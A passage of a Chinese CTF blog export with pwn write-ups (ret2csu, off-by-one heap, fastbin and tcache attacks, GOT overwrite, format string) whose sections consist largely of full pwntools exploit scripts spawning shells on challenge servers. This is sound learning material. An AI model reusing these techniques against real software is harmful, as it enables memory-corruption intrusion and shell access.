b'/bin/sh\\x00') 想象是美好的，但是很快就发现了问题 程序根本无法跳转到main函数，思考了好久就是没想通 后来经过师傅提醒发现payload长度超了 只允许read 0x100个字节，那我们只好缩减payload 经过调试发现rbx寄存器本来就是0，所以我们可以省略p64(rbx)，结果发现长度正好为0x100 然后第二次向bss写数据的时候就又不行了，这个时候rbx就不是0了 所以换个思路，就用普通栈溢出的思路，找到binsh和system的地址，直接执行 由于我本地的环境有很大问题，LibcSearcher不准，每次偏移都差0x1000，我通过gdb的magic找到了system的地址，但是实在找不到binsh的地址了，所以就此作罢，但是理论上是绝对可以打通的 我贴一下最后的exp from pwn import * from LibcSearcher import * context.log_level = 'debug' elf = ELF('./pwn2') p = process('./pwn2') #libc = ELF(&quot;./libc-2.23.so&quot;) write_got = elf.got['write'] read_got = elf.got['read'] main_addr = elf.symbols['main'] print(hex(main_addr)) bss_base = elf.bss() csu_front_addr = 0x4005F0 #csu_end_addr = 0x40060A csu_end_addr = 0x40060B def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = b'a' * 0x88 payload += p64(csu_end_addr) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += b'a' * 0x38 payload += p64(main_addr) p.send(payload) sleep(1) p.recvuntil('welcome~\\n') ## RDI, RSI, RDX, RCX, R8, R9, more on the stack ## write(1,write_got,8) csu(0, 1, write_got, 8, write_got, 1, main_addr) write_addr = u64(p.recv(8)) gdb.attach(p) libc = LibcSearcher('write', write_addr) libc_base = write_addr - libc.dump('write') print(hex(libc_base)) system = libc_base + libc.dump('system') binsh = libc_base + libc.dump('str_bin_sh') ''' libc = ELF('./libc-2.23.so') libc_base = write_addr - libc.symbols['write'] print('libcbase ----&gt; ' + hex(libc_base)) system = libc_base + libc.symbols['system'] binsh = libc_base + libc.search(b'/bin/sh').__next__() ''' p.recvuntil('~\\n') payload = b'a' * 0x88 pop_ret = 0x400613 payload += p64(pop_ret) + p64(binsh) + p64(system) print(&quot;binsh -----&gt; &quot; + hex(binsh)) print(&quot;system -----&gt; &quot; + hex(system)) p.sendline(payload) p.interactive() 然后贴一下我魔改了师傅的exp from pwn import * from LibcSearcher import LibcSearcher def ret2libc(leak, func, path=''): if path == '': libc = LibcSearcher(func, leak) base = leak - libc.dump(func) system = base + 0x3f550 - 0x1000 wrong = base + libc.dump('system') print(hex(wrong)) binsh = base + libc.dump('str_bin_sh') print('str 的偏移为 ： ' + hex(libc.dump('str_bin_sh'))) print('system 的偏移为 ：' + hex(libc.dump('system'))) else: libc = ELF(path) base = leak - libc.sym[func] system = base + libc.sym['system'] binsh = base + libc.search(b'/bin/sh').__next__() return (system,binsh,base) def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 # or csu(0,1,got_write,1,got_write,8,main) The csu functions of different programs need to be analyzed concretely payload = b'a' * 0x88 payload += p64(gadget_pop) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(gadget_call) payload += b'a' * 0x38 payload += p64(last) p.send(payload) return payload s = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), str(data)) sl = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) r = lambda num=4096 :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\0')) uu64 = lambda data :u64(data.ljust(8,b'\\0')) leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) context.log_level = 'DEBUG' binary = './pwn2' context.binary = binary elf = ELF(binary,checksec=False) def dbg(): gdb.attach(p) pause() p = process(binary) #p = remote(&quot;47.95.195.235&quot;,44002) #libc = ELF(&quot;./libc-2.23.so&quot;) main = 0x400587 gadget_pop = 0x40060B gadget_call =0x4005F0 got_write = elf.got['write'] p.recvuntil('\\n') csu(0,1,got_write,8,got_write,1,main) gdb.attach(p) #ru(&quot;welcome~\\n&quot;) write_addr = uu64(r(6)) print('write ---&gt; ' + hex(write_addr)) system,binsh,base = ret2libc(write_addr,'write','') print('system ----&gt; ' + hex(system)) print('binsh ----&gt; ' + hex(binsh)) print(hex(base)) pop_ret = 0x400613 payload3 = b'a' * 136 + p64(pop_ret) + p64(binsh) + p64(system) sla(&quot;welcome~\\n&quot;,payload3) itr() orz wtcl ","link":"https://l3mon629.github.io/post/ret2csu-suo-duan-payload/"},{"title":"一道got表可写的off-by-one — hitcontraining_heapcreator","content":"这个题出了一些坑点，我吐了，做了好久 先正常走一遍吧 off-by-one的流程就是extend chunk 粗糙的写一下刻在DNA里的exp，细节问题错了就错了吧 malloc(overflow) malloc(1) malloc(2) malloc(我来守护上面俩东西不被top chunk吃掉) edit(0,payload) free(1) free(2) leak_libc() some_functions_addr() malloc(size(1) + size(2)) edit(1,写到chunk2的fd pointer) 然后就是fastbin attack 嗯，我一开始也这样做的，很顺利在本地getshell，但是远程打不通 在仓库里有本题目的源码 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; void read_input(char *buf,size_t size){ int ret ; ret = read(0,buf,size); if(ret &lt;=0){ puts(&quot;Error&quot;); _exit(-1); } } struct heap { size_t size ; char *content ; }; struct heap *heaparray[10]; void menu(){ puts(&quot;--------------------------------&quot;); puts(&quot; Heap Creator &quot;); puts(&quot;--------------------------------&quot;); puts(&quot; 1. Create a Heap &quot;); puts(&quot; 2. Edit a Heap &quot;); puts(&quot; 3. Show a Heap &quot;); puts(&quot; 4. Delete a Heap &quot;); puts(&quot; 5. Exit &quot;); puts(&quot;--------------------------------&quot;); printf(&quot;Your choice :&quot;); } void create_heap(){ int i ; char buf[8]; size_t size = 0; for(i = 0 ; i &lt; 10 ; i++){ if(!heaparray[i]){ heaparray[i] = (struct heap *)malloc(sizeof(struct heap)); if(!heaparray[i]){ puts(&quot;Allocate Error&quot;); exit(1); } printf(&quot;Size of Heap : &quot;); read(0,buf,8); size = atoi(buf); heaparray[i]-&gt;content = (char *)malloc(size); if(!heaparray[i]-&gt;content){ puts(&quot;Allocate Error&quot;); exit(2); } heaparray[i]-&gt;size = size ; printf(&quot;Content of heap:&quot;); read_input(heaparray[i]-&gt;content,size); puts(&quot;SuccessFul&quot;); break ; } } } void edit_heap(){ int idx ; char buf[4]; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= 10){ puts(&quot;Out of bound!&quot;); _exit(0); } if(heaparray[idx]){ printf(&quot;Content of heap : &quot;); read_input(heaparray[idx]-&gt;content,heaparray[idx]-&gt;size+1); puts(&quot;Done !&quot;); }else{ puts(&quot;No such heap !&quot;); } } void show_heap(){ int idx ; char buf[4]; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= 10){ puts(&quot;Out of bound!&quot;); _exit(0); } if(heaparray[idx]){ printf(&quot;Size : %ld\\nContent : %s\\n&quot;,heaparray[idx]-&gt;size,heaparray[idx]-&gt;content); puts(&quot;Done !&quot;); }else{ puts(&quot;No such heap !&quot;); } } void delete_heap(){ int idx ; char buf[4]; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= 10){ puts(&quot;Out of bound!&quot;); _exit(0); } if(heaparray[idx]){ free(heaparray[idx]-&gt;content); free(heaparray[idx]); heaparray[idx] = NULL ; puts(&quot;Done !&quot;); }else{ puts(&quot;No such heap !&quot;); } } int main(){ char buf[4]; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); while(1){ menu(); read(0,buf,4); switch(atoi(buf)){ case 1 : create_heap(); break ; case 2 : edit_heap(); break ; case 3 : show_heap(); break ; case 4 : delete_heap(); break ; case 5 : exit(0); break ; default : puts(&quot;Invalid Choice&quot;); break; } } return 0 ; } 逆向 很容易，没有去除符号表，很nice 创建堆块，这里malloc(0x10)来管理堆块 编辑功能存在off-by-one漏洞，可以溢出一字节 free功能没有use after free 漏洞 show功能，可以来leak libc pwn it！！！ 成功的方法：借助heaparray来改写指针 可以看到管理用户堆的内容上是有指针的，我最喜欢指针了（不是 然后我们可以改写指针，因为防护是这样的： 所以可以攻击got表，注意，攻击got的表的核心在于，，这个题是有现成的指针可以利用！如果没有的话，在ubuntu 16中，我们攻击got表的成本会很高，因为要伪造fastbin的size位 那我们思路就是本文一开始说的，只不过不覆盖fd指针而是覆盖题目给我们留下的罢了 先说说坑点吧，我用了libc-2.23.so，但是远程打不通，本地可通，就很难受，所以干脆直接LibcSearcher ，浪费了很多时间 😦 当时做题的思路都写在print语句里了，还挺好的 exp: from pwn import * from LibcSearcher import * #l3mon_w@nts_A_g1rLfri3nd (bushi) #context.log_level = 'debug' local = 1 if local == 1: p = process('./heapcreator') else: p = remote('node3.buuoj.cn',28861) #libc = ELF('./libc.so.6') elf = ELF('./heapcreator') def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap : ',str(size)) p.sendafter('Content of heap:',content) def edit(index,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendafter('Content of heap : ',content) def show(index): p.sendlineafter('Your choice :','3') p.sendlineafter('Index :',str(index)) def delete(index): p.sendlineafter('Your choice :','4') p.sendlineafter('Index :',str(index)) print(&quot;第二个exp的思路是因为这个题目有heaparray来管理我们申请的堆块，在heaparray中有指向内容的指针，所以我们可以改写指针来覆盖got表（got表）可写&quot;) add(0x18,'A') #chunk0 : to overflow the next chunk add(0x30,'B') #chunk1 pause() add(0x60,'C') #chunk2 add(0x10,'/bin/sh\\x00') #chunk3 : to protect edit(0,b'B' * 0x18 + b'\\xf1') delete(1) delete(2) print(&quot;此时big chunk已经构造完成，by gdb , we know the unsorted bin fd ptr and bk ptr&quot;) print(&quot;(by free 0x60 , we can change the fd pointer to fastbin attack) &lt;-------------------- 之前的思路&quot;) print(&quot;this method is attack free@got, the free(sth) = sysetm(/bin/sh;) &quot;) print(&quot;(if we cannot success ,we could use some methods to attack got) &lt;--------------------- so we change that :( !!!!!!!&quot;) add(0xe0,'E') #chunk4 = big chunk print(&quot;we can leak libc&quot;) show(1) p.recvuntil('Content : ') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 37 - 0x10 libc = LibcSearcher('__malloc_hook',__malloc_hook) libc_base = __malloc_hook - libc.dump('__malloc_hook') print(hex(libc_base)) print(&quot;by gdb , we know we already have leaked the libc&quot;) print(&quot;the next,we attack free@got &quot;) free_got = elf.got['free'] #free_addr = libc_base + libc.symbols['free'] system_addr = libc_base + libc.dump('system') print(&quot;free ----------&gt; &quot; + hex(free_got)) print(&quot;system -------&gt; &quot; + hex(system_addr)) payload = p64(__malloc_hook) * 2 payload = payload + p64(0) + p64(0x41) payload = payload + p64(0) * 7 + p64(0x21) + p64(0xe0) + p64(free_got) edit(1,payload) add(0x60,'AAAAAAAA') #chunk5 = chunk2 print(&quot;!!!!!!!!!!!!!!!!!!!!!! 这里不确定编辑块5还是块2，我们就加上p.interactive()拿到原始的交互程序调试一下，经过调试发现没有块5，所以这里我们应该编辑chunk2&quot;) #edit(1,'BBBBBBBB') print(&quot;这里很奇怪，当时我发现大chunk的heaparray在它下面，我还以为是中间出现了不可预知的错误，但是经过调试发现，当我改块1的时候，free_got被改了，那只能证明是改chunk1了&quot;) print(&quot;小声bb，理不清流程就逐个调试（不是）&quot;) edit(1,p64(system_addr)) print(&quot;通过free来触发 system(/bin/sh\\00) 本地测试可拿shell， 美汁汁 :) 好，好起来了（不是）&quot;) delete(3) p.interactive() 失败的方法：one_gadget打__malloc_hook 本地也能拿shell，那肯定就是libc的原因了，one_gadget地址不一样的原因应该是 但是很奇葩，为神马这么说呢，当我打one_gadget的时候发现$rsp + 0x70的位置是NULL，但是one_gadget打不通，反倒是rsp + 0x30可以通 截图： 但是我用0x30的gadget竟然通了，本地可拿shell 不知道怎么回事，反正我人傻了，有感兴趣的师傅可以调试一下什么原因，然后给弟弟讲讲（orz 贴一下exp吧，下午再调试一下看看LibcSearcher能不能通 exp: from pwn import * #context.log_level = 'debug' local = 1 if local == 1: p = process('./heapcreator') else: p = remote('node3.buuoj.cn',26697) libc = ELF('./libc.so.6') def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap : ',str(size)) p.sendafter('Content of heap:',content) def edit(index,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendafter('Content of heap : ',content) def show(index): p.sendlineafter('Your choice :','3') p.sendlineafter('Index :',str(index)) def delete(index): p.sendlineafter('Your choice :','4') p.sendlineafter('Index :',str(index)) print(&quot;初步思路是off-by-one，可以溢出一个字节，所以我们考虑构造重叠chunk&quot;) add(0x18,'A') #chunk0 : to overflow the next chunk add(0x30,'B') #chunk1 add(0x60,'C') #chunk2 add(0x10,'D') #chunk3 : to protect edit(0,b'B' * 0x18 + b'\\xf1') delete(1) print(&quot;此时big chunk已经构造完成，by gdb , we know the unsorted bin fd ptr and bk ptr&quot;) delete(2) print(&quot;by free 0x60 , we can change the fd pointer to fastbin attack&quot;) print(&quot;this method is 'one_gadget' &quot;) print(&quot;if we cannot success ,we could use some methods to attack got&quot;) add(0xe0,'E') #chunk4 print(&quot;we can leak libc&quot;) show(1) #p.recv() p.recvuntil('Content : ') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 37 - 0x10 libc_base = __malloc_hook - libc.symbols['__malloc_hook'] one_gadget_list = [0x3f3d6,0x3f42a,0xd5bf7] one_gadget = libc_base + one_gadget_list[1] print(hex(libc_base)) print(&quot;by gdb , we know we already have leaked the libc&quot;) print(&quot;the next,we do fake chunk&quot;) payload = p64(0) * 3 + p64(0x41) + p64(0) * 7 + p64(0x21) + p64(0xe0) + p64(0x9ba050) + p64(0) + p64(0x71) payload = payload + p64(__malloc_hook-0x23) edit(1,payload) add(0x60,p64(__malloc_hook-0x23)) add(0x60,b'A' * 0x13 + p64(one_gadget)) pause() p.interactive() 又实验了两次，失败的方法终于通了 怎么说呢，比赛不给libc果然是流氓题 在github上下了俩libc都不行，最后用buuctf资源库里面提供的libc打通了 exp没变，就是多加了两行one_gadget_list(哈哈哈哈哈哈哈草) from pwn import * #context.log_level = 'debug' local = 0 if local == 1: p = process('./heapcreator') else: p = remote('node3.buuoj.cn',26902) libc = ELF('./libc-2.23.so') def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap : ',str(size)) p.sendafter('Content of heap:',content) def edit(index,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendafter('Content of heap : ',content) def show(index): p.sendlineafter('Your choice :','3') p.sendlineafter('Index :',str(index)) def delete(index): p.sendlineafter('Your choice :','4') p.sendlineafter('Index :',str(index)) print(&quot;初步思路是off-by-one，可以溢出一个字节，所以我们考虑构造重叠chunk&quot;) add(0x18,'A') #chunk0 : to overflow the next chunk add(0x30,'B') #chunk1 add(0x60,'C') #chunk2 add(0x10,'D') #chunk3 : to protect edit(0,b'B' * 0x18 + b'\\xf1') delete(1) print(&quot;此时big chunk已经构造完成，by gdb , we know the unsorted bin fd ptr and bk ptr&quot;) delete(2) print(&quot;by free 0x60 , we can change the fd pointer to fastbin attack&quot;) print(&quot;this method is 'one_gadget' &quot;) print(&quot;if we cannot success ,we could use some methods to attack got&quot;) add(0xe0,'E') #chunk4 print(&quot;we can leak libc&quot;) show(1) #p.recv() p.recvuntil('Content : ') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 37 - 0x10 libc_base = __malloc_hook - libc.symbols['__malloc_hook'] #one_gadget_list = [0x3f3d6,0x3f42a,0xd5bf7] #one_gadget_list = [0x45226,0x4527a,0xf0364,0xf1207] #one_gadget_list = [0x45206,0x4525a,0xef9f4,0xf0897] one_gadget_list = [0x45216,0x4526a,0xf02a4,0xf1147] one_gadget = libc_base + one_gadget_list[1] print(hex(libc_base)) print(&quot;one_gadget:&quot; + hex(one_gadget)) print(&quot;by gdb , we know we already have leaked the libc&quot;) print(&quot;the next,we do fake chunk&quot;) payload = p64(0) * 3 + p64(0x41) + p64(0) * 7 + p64(0x21) + p64(0xe0) + p64(0x9ba050) + p64(0) + p64(0x71) payload = payload + p64(__malloc_hook-0x23) edit(1,payload) add(0x60,p64(__malloc_hook-0x23)) add(0x60,b'A' * 0x13 + p64(one_gadget)) p.interactive() ","link":"https://l3mon629.github.io/post/yi-dao-got-biao-ke-xie-de-off-by-one-hitcontraining_heapcreator/"},{"title":"buu-pwn(1)","content":"xdctf2015_pwn200 **题，简单题，五分钟能出的题给👴整了一个多小时，全是本地的libc咋也加载不上去，干脆直接LibcSearcher 没啥好说的，只开了nx exp： from pwn import * from LibcSearcher import LibcSearcher #libc = ELF('./libc.so.6') #elf = ELF('./bof') local = 0 if local == 1: p = process('./bof') else: p = remote('node3.buuoj.cn',25267) p.recvuntil('Welcome to XDCTF2015~!\\n') offset = 0x6C + 0x4 write_plt = 0x080483C0 main_addr = 0x0804851C write_got = 0x0804A01C payload = offset * b'A' + p32(write_plt) + p32(main_addr) + p32(0) + p32(write_got) + p32(0x4) p.sendline(payload) write_addr = u32(p.recv()[0:4]) libc = LibcSearcher('write',write_addr) print(&quot;write:&quot; + hex(write_addr)) libc_base = write_addr - libc.dump('write') print('libcbase:' + hex(libc_base)) system_addr = libc_base + libc.dump('system') binsh_addr = libc_base + libc.dump('str_bin_sh') print(hex(binsh_addr)) payload = offset * b'A' + p32(system_addr) * 2 + p32(binsh_addr) p.sendline(payload) p.interactive() [BJDCTF 2nd]secret 第一次碰见这样的题，好题！ 没有做出来wtcl 总结，为啥没做出来？ 1，找到溢出点了但是不知道怎么利用 2，碰见一堆汇编码就看不下去了，没有仔细分析 完整解题过程： checksec发现只开了nx 拿到ida main函数： __int64 __fastcall main(__int64 a1, char **a2, char **a3) { myinit(); if ( judge(a1, a2) ) wrong(); system(&quot;cat /flag&quot;); return 0LL; } 发现是有后门的，但是好像要不触发if才可以，如果if条件满足，就会进入wrong，点进去看看是这样的 wrong函数： void __noreturn wrong() { puts(&quot;#====================================#&quot;); puts(&quot;# GAME OVER #&quot;); puts(&quot;#====================================#&quot;); write_string(&quot;# BYE BYE~ #&quot;, 0x12); printf(buf, 0x12LL); puts(&amp;byte_46B0A7); puts(&quot;@====================================@&quot;); exit(0); } 就退出程序了，那么我们点进去if里面的judge函数看看 这段无法显示为伪代码（好像是大小限制的原因，改idc脚本应该可以反编译，但是我不会orz） 仔细阅读汇编码，可以发现里面有很多比较的操作，我们走到程序里，不妨输入一个数字看看，发现是猜数字的游戏，连续猜对就可以获得flag，但是要猜10000次，在myinit函数里面 第一个点是一个指针，里面存了10000，应该就是猜对的次数，但是是指针，指针都是非常危险的～ 然后第二个点就是有一个read，可以溢出，我们点进去buf看看 可以看到那个指针就在buf下面0x10处，但是我们可控的空间是0x16，所以我们可以控制target指针。 那么我们控制到哪里呢？ 我们在pwndbg里面发现printf的plt和system的plt很接近，就差0x10，而且是printf的plt比system的大0x10，所以我们可以把target改写成printf的got地址，然后每当猜对一次target就会减一，当我们猜对15次，第十六次猜错就会调用printf 而这个时候，printf@plt已经被改成了system@plt，然后存在buf里面的字符串会被当成参数传入system，所以我们只需要在输入name的时候把binsh打进去就好了 exp： from pwn import * local = 0 #context.log_level = 'debug' if local == 1: p = process('./secret') else: p = remote('node3.buuoj.cn',25527) elf = ELF('./secret') printf_got = elf.got['printf'] payload = b'/bin/sh\\x00' + b'A' * (0x10 - 0x8) + b'\\x40\\xD0\\x46' #最后面的是printf的got地址，当然也可以用p32发过去 #print(payload) p.sendline(payload) #pause() number = [0x476B,0x2D38,0x4540,0x3E77,0x3162,0x3F7D,0x357A,0x3CF5,0x2F9E,0x41EA,0x48D8,0x2763,0x474C,0x3809,0x2E63] for i in range(0,15): payload = number[i] p.recvuntil('Secret:') p.sendline(str(payload)) #pause() p.sendlineafter('Secret:','1') p.interactive() ciscn_2019_es_1 今天太忙了，刚搬了宿舍，换了新环境，忙里偷闲打了一道去年的国赛题 目前就找到两种思路，第一种思路打fastbin的时候有些问题，因为不太清楚python怎么传空字符串之类的问题，导致结构体里面的指针一直在变，所以这种思路等过两天有空的时候再想想吧。第二种思路就是打__free_hook，__free_hook(ready to free) === system(&quot;/bin/sh\\x00&quot;) 几个点： 当题目对于申请的chunk大小限制无要求，我们可以申请大chunk，free后放入unsorted bin直接泄漏libc 攻击__free_hook比one_gadget更简单 exp: from pwn import * from LibcSearcher import * #context.log_level = 'debug' local = 1 if local == 1: p = process('./ciscn_2019_es_1') else: p = remote('node3.buuoj.cn',25338) def add(size,name,num): p.sendlineafter('choice:','1') p.sendlineafter('Please input the size of compary\\'s name',str(size)) p.sendafter('please input name:',name) p.sendafter('please input compary call:',num) def show(index): p.sendlineafter('choice:','2') p.sendlineafter('Please input the index:',str(index)) def delete(index): p.sendlineafter('choice:','3') p.sendlineafter('Please input the index:',str(index)) ''' print(&quot;第一种思路：利用fastbin attack 攻击__malloc_hook函数，尚未成功&quot;) print(&quot;========== step 1 : leak libc ============&quot;) add(0x410,'a','b') #0 add(0x10,'c','d') #1 delete(0) show(0) p.recvuntil('name:\\n') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 96 - 0x10 libc = LibcSearcher('__malloc_hook',__malloc_hook) libc_base = __malloc_hook - libc.dump(&quot;__malloc_hook&quot;) print(&quot;libc base : &quot; + hex(libc_base)) print(&quot;=========== step 2 : fastbin attack =========&quot;) add(0x60,'A','B') #3 delete(3) delete(3) add(0x60,p64(__malloc_hook-0x23),'hack') print(&quot;=========== step 3 : one_gadget =========&quot;) one_gadget_list = [0x4f2c5,0x4f322,0x10a38c] one_gadget = libc_base + one_gadget_list[1] add(0x60,0x13 * b'A' + p64(one_gadget),'hhhh') #add(0x10,'a','b') pause() p.interactive() ''' print(&quot;第二种思路：利用unsorted bin逃逸出tcache bin，然后攻击__free_hook&quot;) print(&quot;====================== step1 : leak libc =================&quot;) add(0x410,b'A' * 8,b'B') #0 add(0x10,b'/bin/sh\\00',b'D') #1 add(0x10,b'123',b'hack') #2 delete(0) show(0) p.recvuntil('name:\\n') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 96 -0x10 print(hex(__malloc_hook)) libc = LibcSearcher('__malloc_hook',__malloc_hook) libc_base = __malloc_hook - libc.dump('__malloc_hook') print(&quot;libc base:&quot; + hex(libc_base)) print(&quot;============ step2 : attack __free_hook function =================&quot;) print(&quot;__free_hook(chunk_mem) === system(binsh) &quot;) print(&quot;so we need change '__free_hook' to 'system' &quot;) __free_hook = libc_base + libc.dump(&quot;__free_hook&quot;) system_addr = libc_base + libc.dump(&quot;system&quot;) delete(2) delete(2) add(0x10,p64(__free_hook),b'lemon') #3 add(0x10,p64(system_addr),b'hack') #4 delete(2) p.interactive() 临时加个攻防世界：string 这个题是有个师傅问我的，其实原来做过了，但是好久没有玩过格式化字符串漏洞了，就重新做一下 收获的几个点： 1，注意mmap函数的第三个参数 2，shellcode = asm(shellcraft.sh())能打通，如果再加上str()就不可以了 exp: from pwn import * context.log_level = 'debug' local = 0 if local == 1: p = process('./dragon') else: p = remote('220.249.52.133',37799) p.recvuntil(&quot;secret[0] is &quot;) address = int(p.recvuntil(&quot;\\n&quot;),16) print(hex(address)) p.sendlineafter(&quot;What should your character's name be:\\n&quot;,'name') p.sendlineafter(&quot;So, where you will go?east or up?:\\n&quot;,'east') p.sendlineafter(&quot;go into there(1), or leave(0)?:\\n&quot;,'1') p.sendlineafter(&quot;'Give me an address'\\n&quot;,str(address)) print(&quot;经过测试，发现格式化字符串是第7个参数&quot;) payload = fmtstr_payload(7,{address:85}) p.sendlineafter(&quot;And, you wish is:\\n&quot;,payload) print(&quot;经过格式化字符串，我们可以发送shellcode了，因为mmap的第三个参数&quot;) context(os = 'linux',arch = 'amd64') shellcode = asm(shellcraft.sh()) #shellcode = asm(shellcraft.amd64.linux.sh()) print(shellcode) #shellcode = &quot;\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05&quot; p.recvuntil(&quot;Wizard: I will help you! USE YOU SPELL&quot;) p.sendline(shellcode) p.interactive() wustctf2020_closed 学到了，抽空得学习下IO_FILE的知识 0，1，2 分别对应 stdin stdout stderr close(1) close(2)是关闭了将程序的输出显示到屏幕上，并且关闭了报错信息 可以看到我们其实已经拿到了shell，那么我们直接重定向就好 exec 1&gt;&amp;0 不需要exp 直接nc就好 hitcontraining_magicheap 逆向 main函数，发现框起来的地方有些可疑 点开函数，发现有后门 创建堆块 编辑堆块，存在漏洞，可以自定义堆块编辑的大小（老漏洞了 删除堆块，🈚️UAF 因为没有show函数之类的，所以很难泄漏信息，正好程序没开pie，干脆直接利用后门，想办法在magic附近伪造chunk find_fake_fast永远滴神！！ exp 环境可能出问题了，同样的exp打了十次才通，本地是通了，远程也终于通了 from pwn import * context.log_level = 'debug' local = 0 if local == 1: p = process('./magicheap') else: p = remote('node3.buuoj.cn',25199) def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap :',str(size)) p.sendafter('Content of heap:',content) def edit(index,size,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendlineafter('Size of Heap :',str(size)) p.sendafter('Content of heap:', content) def free(index): p.sendlineafter('Your choice :', '3') p.sendlineafter('Index :',str(index)) print(&quot;===== 第一种思路： 不管后门，直接fastbin attack 打mallochook ======&quot;) print(&quot;======= 但是没有show函数，我们无法泄漏libc ======&quot;) print(&quot;所以综上考虑，要不我们还是利用后门好了-.-||&quot;) ''' add(0x10,b'A' * 8) #chunk0 add(0x30,b'a' * 8) #chunk1 free(1) fake_chunk = 0x602062 payload = 0x10 * b'A' + p64(0) + p64(0x41) + p64(fake_chunk) print(&quot;payload length:&quot; + str(len(payload))) #print(p.recv()) #edit(0,41,payload) ''' print(&quot;double free搞一下&quot;) add(0x30,'A') #chunk0 add(0x60,'B') #chunk1 fake_chunk = 0x60207D free(1) payload = 0x30 * b'A' + p64(0) + p64(0x71) + p64(fake_chunk) print(&quot;这里不知道哪里错了，编辑功能总是上不去，可能是函数内部编写的有问题，懒得看了-.-&quot;) p.sendline('2') p.sendline('0') p.sendline(str(len(payload))) p.send(payload) #edit(0,len(payload),payload) add(0x60,p64(fake_chunk)) payload = 0x13 * b'A' + p64(0x1306) add(0x60,payload) p.interactive() bjdctf_2020_router 好题，感觉这种题才有意思，不像别的题，直接栈溢出啥的或者ROP链 直接看main函数 我们可以利用留言功能，虽然无法栈溢出，但是可以污染数组dest，为什么要污染dest？因为在1里面有system(dest)，我们只需要污染dest，变成binsh即可拿到shell exp from pwn import * local = 0 if local == 1: p = process('./bjdctf_2020_router') else: p = remote('node3.buuoj.cn',29147) elf = ELF('./bjdctf_2020_router') libc = ELF('./libc.so.6') def dbg(): context.log_level = 'debug' #dbg() p.recvuntil('Please input u choose:\\n') p.sendline('3') p.recvuntil('Your suggest will help us to do better!') payload = 0x20 * b'A' + b'/bin/sh\\x00' payload = payload.ljust(0x3A,b'a') p.send(payload) p.recvuntil('Please input u choose:\\n') p.sendline('1') p.interactive() ","link":"https://l3mon629.github.io/post/buu-pwn1/"},{"title":"tcache attack","content":"关于tcache参考了这个师傅的博客：https://www.jianshu.com/p/9778331e1337 tcache tcache结构体 Tcache机制是在libc-2.26中引入的一个新的堆管理机制。 首先是引进了两个结构体，tcache_perthread_struct和tcache_entry tcache_perthread_struct: #define TCACHE_MAX_BINS 64 typedef struct tcache_perthread_struct{ char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS]; }tcache_perthread_struct; tcache_entry: typedef struct tcache_entry{ struct tcache_entry *next; }tcache_entry; 第一个结构体用来管理堆，大小为0x240，可以管理大小小于0x400的堆块，为啥呢？写个简单的小demo大家就明白了 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { void *p,*q,*r,*s,*x; x = malloc(0x10); p = malloc(0x20); q = malloc(0x20); r = malloc(0x30); s = malloc(0x40); free(p); free(q); free(r); free(s); free(x); void *c1,*c2,*c3; c1 = malloc(0x50); c2 = malloc(0x60); c3 = malloc(0x70); free(c1); free(c2); free(c3); return 0; } 上面简单的例子，就是申请了从0x10-0x70大小的堆块，然后我们全部都free掉，然后gdb调试一下会发现如下结果 可以看到tcache_perthread_struct结构体是以一个堆的形式存在于堆空间中管理者堆块，其大小为 0x250，然后不考虑其prevsize和size位，前0x40的空间管理着所有tcache bin的个数（最大是7），从0x10开始，那么就是 0x40 * 8 * 2 = 1024，hex(1024) = 0x400，所以它最大可存到0x400的堆块。 对比fastbin tcache bin与fastbin极其相似但是又有所不同 同：管理方式为FILO的单链表形式，每一个bins的inuse位总为1，不担心合并 异：fastbin的fd的指针指向chunk ptr，而tcache指向mem ptr。tcache不检查chunk的size是否符合要求，也就是说指哪打哪，不用考虑size位了，比如打__malloc_hook不用分配到-0x23的位置了，想分配到哪就分配到哪。tcache不检查double free。tcache优先级最高。 malloc和free的过程 malloc： malloc(size)，若size小于0x400会优先从tcache bins里面寻找，若没有，则再从别的bins里面找。 